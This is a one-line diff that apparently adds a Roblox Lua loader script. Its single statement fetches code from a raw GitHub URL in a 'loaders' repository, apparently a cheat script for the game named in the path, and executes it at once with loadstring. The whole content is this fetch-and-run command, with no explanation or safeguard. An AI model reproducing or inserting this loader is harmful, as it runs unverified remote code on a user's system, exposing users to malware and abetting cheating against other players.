@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/shogun-s-reign-spam7-ju720rzjhhqttf.lua"))()
